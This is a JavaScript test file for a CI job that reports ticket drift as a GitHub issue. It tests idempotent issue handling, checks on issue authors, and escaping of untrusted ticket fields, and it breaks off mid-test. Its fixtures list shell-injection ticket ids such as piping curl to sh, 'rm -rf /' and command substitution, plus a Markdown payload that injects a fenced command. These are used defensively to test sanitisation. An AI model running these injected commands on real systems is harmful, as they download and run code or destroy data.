// ceremony-drift.test.mjs — the drift reporter's decision logic.
//
// This job runs on a schedule and after every merge to main. Its whole value is
// being a signal someone still trusts months from now, so the decision logic is
// tested directly: it must be IDEMPOTENT (a re-run with unchanged drift must not
// touch the issue) and it must CLOSE the issue when drift clears. A reporter
// that re-posts or re-opens on every tick is one people mute.
//
// Only pure decision/render logic is covered here. The `gh` I/O is a thin shell
// in the script's main(), deliberately kept free of branching.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  renderIssueBody,
  renderIssueTitle,
  decideAction,
  selectTrackingIssue,
  MARKER,
  MANAGED_AUTHORS,
} from '../ceremony-drift.mjs';

// Heuristic evidence: scope globs already resolve. Indistinguishable from an
// ACTIVE ticket whose work touches existing paths, so it must never be swept
// into a bulk-completion instruction.
const DRIFT = [
  { id: 'T9', reason: 'inferred: all 6 declared scope glob(s) resolve to tracked files', rails: ['packages/ticket-sync/lib/schema.mjs'], blocker: 'rails-freeze' },
  { id: 'T42', reason: 'inferred: all 3 declared scope glob(s) resolve to tracked files', rails: ['packages/core/**'], blocker: 'rails-freeze' },
];

// Explicit evidence: the ticket itself asserts it is finished.
const DONE = [
  { id: 'T7', reason: 'explicit status: "done"', rails: ['packages/core/**'], blocker: 'rails-freeze' },
];

// The remedy is a PER-TICKET canonical completion: `adlc ticket complete <id>
// --write --authorize`. A ready command is a fenced line naming a SPECIFIC id —
// not the generic `<id>` form the "needs confirmation" guidance mentions in prose
// (a substring check would read that as "offered" from text saying the opposite),
// and not the read-only dry run.
const readyCommandIds = (body) =>
  body
    .split('\n')
    .map((l) => l.trim())
    .map((l) => l.match(/^adlc ticket complete (\S+) --write --authorize --json$/))
    .filter(Boolean)
    .map((m) => m[1]);
const offersCommand = (body) => readyCommandIds(body).length > 0;
// The bulk command must never reappear — it recomputed its set (TOCTOU) and had
// no per-ticket filter (blast radius). Both are why it was replaced.
const offersBulkCommand = (body) => /ticket-prune --ceremony/.test(body);

// The report documents the ceremony as a PROCEDURE WITH PRECONDITIONS. It never
// certifies it as safe, because it cannot: it renders a snapshot at commit A
// while the command recomputes its own target set whenever the operator runs it,
// and `.adlc/current-ticket.json` is gitignored so a CI checkout can never see
// whether anything is in flight. These assert the report keeps saying so.
const CERTIFICATION_CLAIMS = [
  /safe to run as-is/,
  /excluded from the command/,
  /no bulk command is offered/,
];
const makesNoSafetyClaim = (body) => CERTIFICATION_CLAIMS.every((re) => !re.test(body));

// ---- rendering ----

test('body names every drifting ticket and its frozen rails', () => {
  const body = renderIssueBody(DRIFT);
  for (const t of DRIFT) {
    assert.match(body, new RegExp(t.id));
    // Rails are Markdown-escaped (a `*` becomes `\*`), so compare against the
    // escaped form rather than the raw glob.
    for (const rail of t.rails) {
      const escaped = rail.replace(/[\\`*_{}[\]()#+!|<>]/g, (c) => `\\${c}`);
      assert.ok(body.includes(escaped), `missing rail ${rail}`);
    }
  }
});

test('body carries the exact ceremony command for EXPLICITLY done tickets', () => {
  const body = renderIssueBody(DONE);
  assert.ok(offersCommand(body), 'the procedure documents the runnable command');
  assert.match(body, /## Explicitly done/);
});

// The core safety property. `inferred:` means "every scope glob already resolves
// to a tracked file", which is exactly what an ACTIVE ticket looks like when its
// work touches existing paths. Completing such a ticket expires its rails
// mid-build, and an instruction in a bot-filed issue carries more apparent
// authority than a CLI someone chose to run.
test('heuristic-only drift is sorted as unconfirmed and never certified', () => {
  const body = renderIssueBody(DRIFT);
  assert.match(body, /## Needs confirmation before completing \(2\)/);
  assert.match(body, /cannot distinguish "finished" from "in progress on existing files"/);
  assert.ok(makesNoSafetyClaim(body));
});

test('the ACTIVE ticket is listed first, under its own warning', () => {
  const body = renderIssueBody([...DONE, ...DRIFT], { activeTicketId: 'T42' });
  assert.match(body, /## ⚠ Currently active — do NOT complete \(1\)/);
  const activeIdx = body.indexOf('Currently active');
  const doneIdx = body.indexOf('## Explicitly done');
  assert.ok(activeIdx < doneIdx, 'the warning must precede the rest of the report');
  // The active ticket is not double-listed under the done heading.
  const doneSection = body.slice(doneIdx, body.indexOf('## Needs confirmation'));
  assert.doesNotMatch(doneSection, /T42/);
  assert.match(body, /expire its rails while it is still being built/);
  assert.ok(makesNoSafetyClaim(body));
});

test('an explicitly-done ticket that is ALSO active is flagged, not silently cleared', () => {
  const body = renderIssueBody(DONE, { activeTicketId: 'T7' });
  assert.match(body, /## ⚠ Currently active/);
  // It must NOT claim the command skips it — the command has no per-ticket filter.
  assert.match(body, /including this one/);
  assert.ok(makesNoSafetyClaim(body));
});

test('body embeds the discovery marker', () => {
  assert.ok(renderIssueBody(DRIFT).includes(MARKER));
});

// The marker is only useful if GitHub actually hides it. A malformed marker
// still "matches" itself — every test comparing against the constant passes —
// while rendering as visible junk at the top of the issue.
test('marker is a well-formed HTML comment (renders invisibly)', () => {
  assert.match(MARKER, /^<!--.*-->$/);
});

// This line is the operator-facing statement of the T36 rule. Inverted, it is
// not a typo — it is wrong instructions in the one place someone reads them.
test('body states the completion rule correctly', () => {
  const body = renderIssueBody(DONE);
  assert.match(body, /marked `completed: true`/);
  assert.doesNotMatch(body, /marked `completed: false`/);
});

// ---- the bulk command's blast radius ----
//
// `ticket-prune --ceremony` has NO per-ticket filter: it completes every stale
// rail-freezing ticket. Splitting the report into sections partitions the
// DISPLAY only. Rendering the command next to an "excluded" entry would be a
// false safety claim an operator acts on — completing in-flight work and
// expiring its rails. So the command appears only when EVERY rail-freezing entry
// is confirmed done.

const CONFIRMED = { id: 'T7', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' };
const HEURISTIC = { id: 'T9', reason: 'inferred: scope resolves', rails: ['b/**'], blocker: 'rails-freeze' };

test('mixed confirmed/unconfirmed states the blast radius rather than certifying', () => {
  const body = renderIssueBody([CONFIRMED, HEURISTIC]);
  assert.match(body, /no per-ticket filter/);
  assert.ok(makesNoSafetyClaim(body));
});

test('an ACTIVE ticket is surfaced with an explicit do-not-complete warning', () => {
  const body = renderIssueBody([CONFIRMED, HEURISTIC], { activeTicketId: 'T9' });
  assert.match(body, /## ⚠ Currently active/);
  assert.match(body, /expire its rails while it is still being built/);
  assert.ok(makesNoSafetyClaim(body));
});

// The active section must not promise an exclusion the command cannot deliver.
test('the active-ticket warning never claims the command excludes it', () => {
  const body = renderIssueBody([CONFIRMED, HEURISTIC], { activeTicketId: 'T9' });
  assert.doesNotMatch(body, /excluded from the command below/);
});

test('confirmed plus a manual-decision entry still renders the procedure', () => {
  const manual = { id: 'T8', reason: 'explicit status: "done"', rails: [], blocker: 'preexisting-completed-field' };
  const body = renderIssueBody([CONFIRMED, manual]);
  assert.ok(offersCommand(body));
  assert.ok(makesNoSafetyClaim(body));
});

test('an unresolvable pointer sorts everything as unconfirmed', () => {
  const body = renderIssueBody([CONFIRMED], { activeTicketUnknown: true });
  assert.match(body, /## Needs confirmation before completing \(1\)/);
  assert.doesNotMatch(body, /## Explicitly done/);
});

// ---- title ----

test('title is singular for one ticket and plural otherwise', () => {
  assert.match(renderIssueTitle([{ id: "T1" }]), /1 shipped ticket awaiting/);
  assert.match(renderIssueTitle([{ id: "T1" }, { id: "T2" }]), /2 shipped tickets awaiting/);
  assert.match(renderIssueTitle([]), /0 shipped tickets awaiting/);
});

// ---- issue discovery ----
//
// If this ever stops matching an issue that exists, the job opens a DUPLICATE on
// every run — the exact churn idempotence exists to prevent. It lived in the gh
// I/O shell and was untested until mutation testing surfaced it.

test('selectTrackingIssue finds the issue carrying the marker', () => {
  const found = selectTrackingIssue([
    { number: 1, body: 'unrelated issue' },
    { number: 2, body: `${MARKER}\n\nthe tracking issue` },
  ]);
  assert.equal(found.number, 2);
});

test('selectTrackingIssue returns null when no issue carries the marker', () => {
  assert.equal(selectTrackingIssue([{ number: 1, body: 'unrelated' }]), null);
  assert.equal(selectTrackingIssue([]), null);
  assert.equal(selectTrackingIssue(null), null);
});

// The marker is public — it renders into the issue body and is trivially copied.
// Treating "body contains the marker" as authority would let anyone who can open
// an issue have it labeled, rewritten, or closed by a job holding issues:write.
test('an authors filter rejects a forged marker from another author', () => {
  const issues = [{ number: 9, body: `${MARKER} forged`, author: { login: 'untrusted-user' } }];
  assert.equal(selectTrackingIssue(issues, { authors: ['github-actions[bot]'] }), null);
  // Without the filter (the labeled fast path) the same issue is still matched —
  // there, applying the label was itself the authorization.
  assert.equal(selectTrackingIssue(issues)?.number, 9);
});

test('an authors filter accepts the managed author', () => {
  const issues = [{ number: 9, body: `${MARKER} real`, author: { is_bot: true, login: 'github-actions[bot]' } }];
  assert.equal(selectTrackingIssue(issues, { authors: ['github-actions[bot]'] }).number, 9);
});

// REGRESSION (#265). Every fixture above hand-writes 'github-actions[bot]', the
// same string the production default hard-coded — so they agreed with each other
// while both disagreed with reality. `gh issue list --json author` returns the
// GraphQL actor, which gh renders 'app/github-actions'; recorded verbatim:
//
//   $ gh issue view 264 --json author
//   {"author":{"is_bot":true,"login":"app/github-actions"}}
//
// The filter therefore rejected the job's OWN tracker on both lookup paths, and
// ceremony-drift opened a duplicate on every push to main (12 in two days).
// These assert against the recorded payload AND the shipped default, so a future
// edit cannot leave the constant wrong about the outside world unnoticed.
const GH_RECORDED_BOT_AUTHOR = { is_bot: true, login: 'app/github-actions' };

test('the default managed-author set accepts the author gh actually reports', () => {
  const issues = [{ number: 9, body: `${MARKER} real`, author: GH_RECORDED_BOT_AUTHOR }];
  assert.equal(selectTrackingIssue(issues, { authors: MANAGED_AUTHORS })?.number, 9);
});

// One bot, several renderings across gh versions and the REST/GraphQL split. All
// must resolve to the same identity, so the tracker survives gh changing how it
// formats an App actor — the exact class of change that caused #265.
test('every rendering of the same bot actor is one identity', () => {
  for (const login of ['app/github-actions', 'github-actions[bot]', 'github-actions', 'GitHub-Actions[bot]']) {
    const issues = [{ number: 9, body: `${MARKER} real`, author: { is_bot: true, login } }];
    assert.equal(
      selectTrackingIssue(issues, { authors: MANAGED_AUTHORS })?.number,
      9,
      `login '${login}' should resolve to the managed bot`
    );
  }
});

// Normalization strips the '[bot]' suffix, which ALONE would let a human account
// literally named 'github-actions' seize the tracker — a privilege escalation the
// pre-#265 exact-match comparison did not have. Bot-ness is required alongside
// the name so this fix cannot widen the authorization it was meant to repair.
test('a human account whose name normalizes to the bot is still rejected', () => {
  for (const author of [
    { is_bot: false, login: 'github-actions' },
    { login: 'github-actions' }, // is_bot absent → not provably a bot → reject
  ]) {
    const issues = [{ number: 9, body: `${MARKER} forged`, author }];
    assert.equal(
      selectTrackingIssue(issues, { authors: MANAGED_AUTHORS }),
      null,
      `author ${JSON.stringify(author)} must not be accepted as the managed bot`
    );
  }
});

// ADLC_DRIFT_AUTHORS is documented as overridable "for repos whose automation
// runs under a different identity" — commonly a dedicated MACHINE USER, which
// GitHub reports with `is_bot: false`. Requiring bot-ness unconditionally would
// reject that configured author and recreate #265 under the override: duplicate
// opens while drift exists, and a stale tracker left open once it clears.
//
// So the two acceptance routes are deliberately not equally strict. An EXACT
// match against a configured entry is explicit operator intent and needs no
// further evidence. Only the NORMALIZED route widens the match beyond what was
// configured, and only there can one login alias onto another — so only there is
// bot evidence required.
test('an exactly-configured non-bot author is accepted (the machine-user override)', () => {
  const issues = [{ number: 9, body: `${MARKER} real`, author: { is_bot: false, login: 'release-machine' } }];
  assert.equal(selectTrackingIssue(issues, { authors: ['release-machine'] })?.number, 9);
  // ...and still closes the loop end-to-end: found means updated, not duplicated.
  const decision = decideAction({
    drift: [{ id: 'T1', blocker: 'rails-freeze', rails: ['a.test.mjs'], reason: 'shipped' }],
    existingIssue: selectTrackingIssue(issues, { authors: ['release-machine'] }),
  });
  assert.equal(decision.action, 'update');
  assert.equal(decision.number, 9);
});

test('an exact configured match is case-insensitive and needs no is_bot field', () => {
  const issues = [{ number: 9, body: `${MARKER} real`, author: { login: 'Release-Machine' } }];
  assert.equal(selectTrackingIssue(issues, { authors: ['release-machine'] })?.number, 9);
});

// `is_bot` is not guaranteed to be present on every API surface, so the login
// SHAPE is the fallback bot evidence: GitHub emits the `app/` prefix and the
// `[bot]` suffix only for App actors. Each form must qualify on its own.
//
// Caught as a surviving `logic-swap` mutant (`||` → `&&`) on isBotFormLogin:
// every other fixture here sets `is_bot: true`, which short-circuits the check
// before it is ever reached, so the function was entirely unexercised. Each case
// below matches only through NORMALIZATION and omits `is_bot`, which is the one
// path where the shape is load-bearing.
test('each bot-login form is sufficient evidence on its own, without is_bot', () => {
  // 'app/' prefix arm: configured as the [bot] form, reported as the app/ form.
  assert.equal(
    selectTrackingIssue([{ number: 9, body: `${MARKER} real`, author: { login: 'app/github-actions' } }],
      { authors: ['github-actions[bot]'] })?.number,
    9
  );
  // '[bot]' suffix arm: configured as the app/ form, reported as the [bot] form.
  assert.equal(
    selectTrackingIssue([{ number: 9, body: `${MARKER} real`, author: { login: 'github-actions[bot]' } }],
      { authors: ['app/github-actions'] })?.number,
    9
  );
});

// The author object is API-shaped data, not a guaranteed contract — the same
// reason bodies are tolerated below. An issue with no author (or an author with
// no login) carries NO authorization evidence at all, so under an active filter
// it must be rejected rather than treated as anonymous-and-therefore-fine.
// Caught as a surviving `bool-flip` mutant on the `if (!login) return false`
// guard: the guard was correct but nothing noticed when it stopped being.
test('an author with no usable login is rejected under an authors filter', () => {
  for (const author of [undefined, null, {}, { login: '' }, { login: '   ' }, { is_bot: true }]) {
    const issues = [{ number: 9, body: `${MARKER} real`, author }];
    assert.equal(
      selectTrackingIssue(issues, { authors: MANAGED_AUTHORS }),
      null,
      `author ${JSON.stringify(author)} carries no authorization and must be rejected`
    );
  }
});

// An empty/whitespace ADLC_DRIFT_AUTHORS entry must not become a wildcard that
// matches the empty-login case above. The production constant already filters
// blanks; this pins the comparison itself so both halves cannot fail together.
test('a blank configured author never matches a blank login', () => {
  const issues = [{ number: 9, body: `${MARKER} forged`, author: { login: '' } }];
  assert.equal(selectTrackingIssue(issues, { authors: ['', '  '] }), null);
});

// The exact-match route must not become a backdoor: it accepts only logins that
// are literally configured, so an unconfigured account is still rejected even
// when it is a bot.
test('an unconfigured author is rejected however it is shaped', () => {
  for (const author of [
    { is_bot: true, login: 'app/some-other-bot' },
    { is_bot: true, login: 'attacker[bot]' },
    { is_bot: false, login: 'untrusted-user' },
  ]) {
    const issues = [{ number: 9, body: `${MARKER} forged`, author }];
    assert.equal(selectTrackingIssue(issues, { authors: ['release-machine'] }), null);
  }
});

// The whole point of the fix: with a tracker present, the job must UPDATE it.
// #265 was not a lookup curiosity — it changed decideAction's branch from
// 'update' to 'open' on every run, which is what produced the duplicates.
test('a recognized tracker updates in place instead of opening a duplicate', () => {
  const drift = [{ id: 'T1', blocker: 'rails-freeze', rails: ['a.test.mjs'], reason: 'shipped' }];
  const existing = selectTrackingIssue(
    [{ number: 230, title: 'stale title', body: `${MARKER} stale`, author: GH_RECORDED_BOT_AUTHOR }],
    { authors: MANAGED_AUTHORS }
  );
  assert.ok(existing, 'the tracker gh reports must be found');
  const decision = decideAction({ drift, existingIssue: existing });
  assert.equal(decision.action, 'update');
  assert.equal(decision.number, 230);
});

// Guessing between two marked issues risks overwriting or closing the wrong one,
// and both are destructive under issues:write.
test('two marked issues throw rather than picking one', () => {
  const two = [
    { number: 1, body: `${MARKER} a`, author: { login: 'github-actions[bot]' } },
    { number: 2, body: `${MARKER} b`, author: { login: 'github-actions[bot]' } },
  ];
  assert.throws(() => selectTrackingIssue(two), /ambiguous tracking issue/);
  assert.throws(() => selectTrackingIssue(two, { authors: ['github-actions[bot]'] }), /ambiguous/);
});

test('ambiguity is judged AFTER the author filter (one real + one forged is fine)', () => {
  const mixed = [
    { number: 1, body: `${MARKER} real`, author: { login: 'github-actions[bot]' } },
    { number: 2, body: `${MARKER} forged`, author: { login: 'untrusted-user' } },
  ];
  assert.equal(selectTrackingIssue(mixed, { authors: ['github-actions[bot]'] }).number, 1);
});

test('selectTrackingIssue tolerates missing/non-string bodies without throwing', () => {
  const found = selectTrackingIssue([
    { number: 1 },
    { number: 2, body: null },
    { number: 3, body: 42 },
    null,
    { number: 4, body: `${MARKER} here` },
  ]);
  assert.equal(found.number, 4);
});

// Ordering must not depend on the order runTicketPrune happens to emit, or the
// body churns between runs and every tick looks like new drift.
test('body is stable regardless of input order (idempotence depends on this)', () => {
  assert.equal(renderIssueBody(DRIFT), renderIssueBody([...DRIFT].reverse()));
});

// Fixture note: a 'preexisting-completed-field' entry ALWAYS has `rails: []` —
// ceremonyDisposition() checks non-empty rails first and classifies those as
// 'rails-freeze'. An earlier version of this test gave it rails, asserting
// against a state the producer cannot emit.
const MIXED = [
  { id: 'T1', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' },
  { id: 'T2', reason: 'explicit status: "done"', rails: [], blocker: 'preexisting-completed-field' },
];

test('body separates the two blockers into their own sections', () => {
  const body = renderIssueBody(MIXED);
  assert.match(body, /## Explicitly done \(1\)/);                        // rails-freeze
  assert.match(body, /## Needs a manual decision \(1\)/);                       // preexisting-completed-field
});

// The advertised command completes ONLY rails-freeze entries; --ceremony refuses
// to overwrite a deliberately-set `completed` value. Promising it clears
// everything would be instructions that never stop being wrong, on an issue that
// can never close.
test('manual-decision entries are documented as NOT cleared by the ceremony', () => {
  const body = renderIssueBody(MIXED);
  const manualIdx = body.indexOf('## Needs a manual decision');
  assert.ok(manualIdx !== -1);
  assert.match(body.slice(manualIdx), /will \*\*not\*\* clear them/);
});

test('a drift set of only manual-decision entries advertises no ceremony command', () => {
  const body = renderIssueBody([MIXED[1]]);
  assert.doesNotMatch(body, /ticket-prune --ceremony/);
  assert.match(body, /## Needs a manual decision \(1\)/);
});

// 'preexisting-completed-field' entries always have empty rails, so a title
// asserting everything is "freezing rails" would be false whenever one appears.
test('title does not claim rails are frozen', () => {
  assert.doesNotMatch(renderIssueTitle(MIXED), /freezing rails/);
  assert.match(renderIssueTitle(MIXED), /2 shipped tickets awaiting completion/);
});

// Evidence handling is an ALLOW-LIST: anything that is not an explicit
// done-status — inferred, absent, malformed, or a reason string that gets
// renamed upstream — must land in "needs confirmation". Failing open here would
// promote a ticket into the rail-expiring command on evidence nobody verified.
test('unknown or missing evidence falls back to needs-confirmation, not clearable', () => {
  for (const reason of [undefined, '', 'r', 'some future reason string', null]) {
    const body = renderIssueBody([{ id: 'TX', reason, rails: ['a/**'], blocker: 'rails-freeze' }]);
    assert.doesNotMatch(body, /## Explicitly done/, `reason ${JSON.stringify(reason)} must not read as confirmed`);
    assert.match(body, /## Needs confirmation before completing \(1\)/);
  }
});

// resolveActiveTicketId returns a RESULT and never throws; a malformed or
// conflicting pointer is ok:false (#196's fail-closed contract). When it cannot
// be resolved we do not know which ticket is in flight, so nothing may be
// advertised as safe to bulk-complete — not even explicitly-done entries.
test('an unresolvable active-ticket pointer downgrades every entry to unconfirmed', () => {
  const body = renderIssueBody(DONE, { activeTicketUnknown: true });
  assert.doesNotMatch(body, /## Explicitly done/);
  assert.match(body, /## Needs confirmation before completing \(1\)/);
  assert.match(body, /active-ticket pointer could not be resolved/);
});

test('decideAction threads the unknown-pointer state into the body', () => {
  const d = decideAction({ drift: DONE, existingIssue: null, activeTicketUnknown: true });
  assert.equal(d.action, 'open');
  assert.doesNotMatch(d.body, /## Explicitly done/);
});

// The procedure section is the one place the command appears. It must always
// disclose what CI cannot see, and always lead with the dry run.
test('the procedure discloses the CI blind spots and leads with a dry run', () => {
  const body = renderIssueBody(DONE); // explicit-done, so a per-ticket command is present
  assert.ok(offersCommand(body), 'the procedure documents the completion command');
  assert.match(body, /cannot see whether a ticket is still being/); // the blind spot it can name
  assert.match(body, /gitignored/);
  const dryIdx = body.indexOf('# dry run');
  const cmdIdx = body.indexOf('adlc ticket complete');
  assert.ok(dryIdx !== -1 && cmdIdx !== -1 && dryIdx < cmdIdx, 'the read-only dry run must come first');
});

// The bulk `ticket-prune --ceremony` is gone entirely: it recomputed its target
// set at run time (a TOCTOU window) and had no per-ticket filter. Its replacement
// names one id per command, so neither failure mode is expressible.
test('the report never renders the bulk ceremony command', () => {
  for (const fixture of [DONE, DRIFT, [...DONE, ...DRIFT]]) {
    assert.ok(!offersBulkCommand(renderIssueBody(fixture)), 'bulk ticket-prune --ceremony must not appear');
  }
});

// A ready command is offered ONLY for confirmed (explicit-done) entries. A
// heuristic entry gets no specific command — but note it does NOT suppress the
// commands for confirmed entries beside it (see the next test), because per-ticket
// commands don't share a blast radius.
test('heuristic-only drift shows the dry run but offers no ready command', () => {
  const body = renderIssueBody(DRIFT); // both entries are `inferred:`
  assert.match(body, /# dry run/, 'the read-only dry run is always available');
  assert.deepEqual(readyCommandIds(body), [], 'no ready command without authoritative evidence');
});

// The round-6 blast-radius limitation is GONE. Under the old bulk command, one
// heuristic entry tainted the whole set and withheld the command from everyone.
// Per-ticket commands are scoped to a single id, so a confirmed ticket beside a
// heuristic one still gets its own command — and the heuristic one does not.
test('a confirmed entry beside a heuristic one gets its own command; the heuristic one does not', () => {
  const body = renderIssueBody([
    { id: 'T7', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' },
    { id: 'T9', reason: 'inferred: scope resolves', rails: ['b/**'], blocker: 'rails-freeze' },
  ]);
  assert.deepEqual(readyCommandIds(body), ['T7'], 'only the confirmed ticket gets a ready command');
});

test('every confirmed entry gets its own per-ticket command', () => {
  const body = renderIssueBody([
    { id: 'T7', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' },
    { id: 'T8', reason: 'explicit status: "done"', rails: ['b/**'], blocker: 'rails-freeze' },
  ]);
  assert.deepEqual(readyCommandIds(body).sort(), ['T7', 'T8']);
});

test('a drift set with nothing rail-freezing renders no procedure at all', () => {
  const manualOnly = [{ id: 'T8', reason: 'explicit status: "done"', rails: [], blocker: 'preexisting-completed-field' }];
  const body = renderIssueBody(manualOnly);
  assert.doesNotMatch(body, /## Clearing these/);
  assert.ok(!offersCommand(body));
});

// ---- decisions ----

test('drift with no existing issue → open', () => {
  const d = decideAction({ drift: DRIFT, existingIssue: null });
  assert.equal(d.action, 'open');
  assert.ok(d.title.length > 0);
  assert.ok(d.body.includes(MARKER));
});

test('drift with an identical open issue → noop (no re-post churn)', () => {
  const first = decideAction({ drift: DRIFT, existingIssue: null });
  const again = decideAction({
    drift: DRIFT,
    existingIssue: { number: 7, title: first.title, body: first.body },
  });
  assert.equal(again.action, 'noop');
});

test('drift that CHANGED vs the open issue → update', () => {
  const first = decideAction({ drift: DRIFT, existingIssue: null });
  const grown = decideAction({
    drift: [...DRIFT, { id: 'T99', reason: 'r', rails: ['z/**'], blocker: 'rails-freeze' }],
    existingIssue: { number: 7, title: first.title, body: first.body },
  });
  assert.equal(grown.action, 'update');
  assert.equal(grown.number, 7);
  assert.match(grown.body, /T99/);
});

test('a title-only change still updates', () => {
  const first = decideAction({ drift: DRIFT, existingIssue: null });
  const d = decideAction({
    drift: DRIFT,
    existingIssue: { number: 7, title: 'something stale', body: first.body },
  });
  assert.equal(d.action, 'update');
});

test('drift cleared with an open issue → close', () => {
  const d = decideAction({ drift: [], existingIssue: { number: 7, title: 't', body: 'b' } });
  assert.equal(d.action, 'close');
  assert.equal(d.number, 7);
});

test('no drift and no issue → noop', () => {
  assert.equal(decideAction({ drift: [], existingIssue: null }).action, 'noop');
});

// The reporter must never be the reason a merge or a schedule tick fails: it is
// an issue-management job, not a gate. Callers rely on this to keep exit 0.
test('decideAction never throws on a malformed drift entry', () => {
  const junk = [{ id: 'T1' }, {}, { id: 'T2', rails: null, blocker: undefined }];
  const d = decideAction({ drift: junk, existingIssue: null });
  assert.equal(d.action, 'open');
  assert.match(d.body, /T1/);
});

// ---- backend independence ----
//
// The remedy is the same on both backends. `adlc ticket complete <id> --write
// --authorize` goes through TicketService and works identically on tickets.json
// and the directory store (verified end-to-end in ceremony-drift-exit.test.mjs),
// so there is no backend branch and no directory-specific raw-edit path — the
// latter bypassed the store's lock, CAS, journal, and manifest evidence.

test('the body carries the canonical per-ticket command, never a raw shard edit', () => {
  const body = renderIssueBody(DONE);
  assert.match(body, /adlc ticket complete T7 --write --authorize/);
  assert.doesNotMatch(body, /add `completed: true` to each/); // the old raw-edit remedy
  assert.doesNotMatch(body, /not supported for the directory ticket store/);
});

test('the completion command records evidence and uses the transaction (documented)', () => {
  const body = renderIssueBody(DONE);
  assert.match(body, /\.adlc\/manifest\.jsonl/, 'the body tells the operator evidence is recorded');
  assert.match(body, /transaction/);
});

// ---- ticket ids are interpolated into shell; treat them as untrusted ----
//
// A ticket id comes from the repo (a merged ticket) and is rendered into a
// copy-paste command in a bot-authored issue. The store validator accepts
// arbitrary strings, so a crafted id would be executable shell for an admin.
// Only ids matching `[A-Za-z0-9._-]` are rendered as commands; the rest are
// surfaced without one. No metacharacter survives the gate, so injection is
// structurally impossible rather than quoted-and-hoped.
const SHELL_INJECTION_IDS = [
  'T7; curl evil | sh',
  'T7 && rm -rf /',
  'T7$(whoami)',
  'T7`id`',
  'T7\nrm -rf x',
  '$(touch pwned)',
  '--authorize',        // an id that is itself a flag
  'a b',                // whitespace
  "T7'",                // quote
];

for (const id of SHELL_INJECTION_IDS) {
  test(`a malicious ticket id (${JSON.stringify(id).slice(0, 24)}) is never rendered as a command`, () => {
    const body = renderIssueBody([{ id, reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' }]);
    // No runnable adlc-tickets line carries the raw id.
    assert.ok(!body.split('\n').some((l) => l.trim().startsWith('adlc ticket complete') && l.includes(id)),
      'the raw id must not appear in a runnable command');
    // It is surfaced as unsafe instead, not silently dropped.
    assert.match(body, /cannot be safely/);
  });
}

test('a safe id is rendered with --json (which suppresses interactive migration)', () => {
  const body = renderIssueBody([{ id: 'T-CC1', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' }]);
  assert.match(body, /adlc ticket complete T-CC1 --write --authorize --json/);
});

test('a mix of safe and unsafe ids renders the safe one and flags the unsafe one', () => {
  const body = renderIssueBody([
    { id: 'T7', reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' },
    { id: 'T7; rm -rf /', reason: 'explicit status: "done"', rails: ['b/**'], blocker: 'rails-freeze' },
  ]);
  assert.deepEqual(readyCommandIds(body), ['T7']);
  assert.match(body, /cannot be safely/);
});

// ---- Markdown injection via ANY interpolated ticket field ----
//
// The runnable-command allow-list guards only the command line. Ids, rails, and
// reasons are ALSO rendered — into headings and code spans — and all are
// untrusted (a merged ticket, arbitrary strings). A newline-bearing value could
// otherwise open its own ```bash fence with an authoritative-looking command.
// Round 17 fixed only the command; this covers every other field.

// The dry-run command is the one line the reporter legitimately fences. Any
// OTHER fenced command, or any fence at all introduced by field content, is an
// injection.
const fencedLines = (body) => {
  const out = [];
  let inFence = false;
  for (const l of body.split('\n')) {
    if (l.trim().startsWith('```')) { inFence = !inFence; continue; }
    if (inFence) out.push(l.trim());
  }
  return out;
};
// The property: a crafted field value cannot introduce the attacker's target
// (VICTIM) as a fenced or standalone runnable command. Legitimate fenced
// commands (the dry-run, a real `complete <safe-id>`) are fine; only injected
// content is forbidden. The payload's text may still appear INLINE as inert,
// backslash-escaped characters — harmless, not copy-pasteable.
const assertNoInjectedCommand = (body) => {
  assert.ok(!fencedLines(body).some((l) => l.includes('VICTIM')), 'no injected command inside a fence');
  const runnable = body.split('\n').map((l) => l.trim())
    .filter((l) => /^adlc ticket complete VICTIM\b/.test(l));
  assert.deepEqual(runnable, [], 'the injected command must not appear as a standalone runnable line');
};

const INJECTION_PAYLOAD = 'X\n\n```bash\nadlc ticket complete VICTIM --write --authorize --json\n```\n';

test('a newline+fence in a ticket ID cannot inject a runnable command block', () => {
  const body = renderIssueBody([
    { id: INJECTION_PAYLOAD, reason: 'explicit status: "done"', rails: ['a/**'], blocker: 'rails-freeze' },
  ]);
  assertNoInjectedCommand(body);
});

test('a newline+fence in a RAIL cannot inject a runnable command block', () => {
  const body = renderIssueBody([
    { id: 'T7', reason: 'explicit status: "done"', rails: [`packages/**${INJECTION_PAYLOAD}`], blocker: 'rails-freeze' },
  ]);
  assertNoInjectedCommand(body);
});

test('a newline+fence in the REASON cannot inject a runnable command block', () => {
  // reason embeds ticket.status, which is user-controlled: `explicit status: "<status>"`.
  const body = renderIssueBody([
    { id: 'T9', reason: `inferred: x${INJECTION_PAYLOAD}`, rails: ['a/**'], blocker: 'rails-freeze' },
  ]);
  assertNoInjectedCommand(body);
});

test('control characters in a field cannot introduce any new line in the body', () => {
  // Every rendered field is single-line after sanitization: a field value must
  // not add a line to the body beyond the one heading/bullet it belongs to.
  const clean = renderIssueBody([{ id: 'T7', reason: 'inferred: x', rails: ['a/**'], blocker: 'rails-freeze' }]);
  const dirty = renderIssueBody([{ id: 'T7\n\n\n\n\n', reason: 'inferred: x', rails: ['a/**'], blocker: 'rails-freeze' }]);
  assert.equal(dirty.split('\n').length, clean.split('\n').length, 'field newlines must not add body lines');
});

test('markdown metacharacters in a field are escaped, not rendered as structure', () => {
  const body = renderIssueBody([
    { id: 'T7', reason: 'explicit status: "done"', rails: ['`code`[link](x)*em*'], blocker: 'rails-freeze' },
  ]);
  assert.match(body, /\\`code\\`\\\[link\\\]\\\(x\\\)\\\*em\\\*/, 'metacharacters must be backslash-escaped');
});

// ---- an unbounded ID must not be able to blow the GitHub issue-body limit ----
//
// A confirmed id is interpolated RAW into the fenced command (it has to name the
// real id), where the display clamp does not reach. The store accepts arbitrarily
// long ids, so without a length bound a single pathological id could push the body
// past GitHub's ~65_536-byte limit, failing every create/update and silently
// disabling the reporter. Over the bound → surfaced without a command, not run.
test('an over-long ticket id is not rendered as a runnable command', () => {
  const longId = 'T' + 'x'.repeat(200);
